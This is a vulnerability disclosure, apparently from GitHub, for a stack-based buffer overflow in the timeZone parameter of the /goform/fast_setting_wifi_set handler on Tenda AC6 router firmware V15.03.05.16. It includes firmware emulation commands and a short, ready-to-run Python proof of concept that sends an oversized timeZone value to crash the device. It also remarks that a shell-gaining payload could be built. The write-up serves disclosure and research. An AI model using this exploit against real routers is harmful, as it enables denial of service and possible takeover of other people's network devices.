form\_fast\_setting\_wifi\_set  timeZone
----------------------------------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![image](https://github.com/user-attachments/assets/9dd2dd44-e173-4d40-87f2-8e167129aaae)


### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

### Vulnerability details

  
This function accepts the POST parameter timeZone, does not verify its length, and copies it directly to a local variable on the stack, resulting in a stack overflow. This vulnerability allows an attacker to cause a denial of service (DoS), but of course you can build a payload to get a stable shell to control the device.

![image](https://github.com/user-attachments/assets/e7840daa-e832-43d5-a6d4-04e41c463514)

A vulnerability was found in Tenda AC6 V15.03.05.16. The vulnerability affects the functionality of the /goform/fast\_setting\_wifi\_set file form\_fast\_setting\_wifi\_set. Using the timeZone parameter causes a stack-based buffer overflow. The attack can be launched remotely.

### poc

```text-plain
import requests

# URL
url = "http://192.168.142.100/goform/fast_setting_wifi_set"


# POST
data = {
    "ssid": b"Raining",
    "timeZone": b'Raining'*0x100
}


response = requests.post(url,data=data)

print("Status Code:", response.status_code)
print("Response Body:", response.text)
```
![image](https://github.com/user-attachments/assets/73b652ce-47fd-497e-9cfa-168ec08c6626)

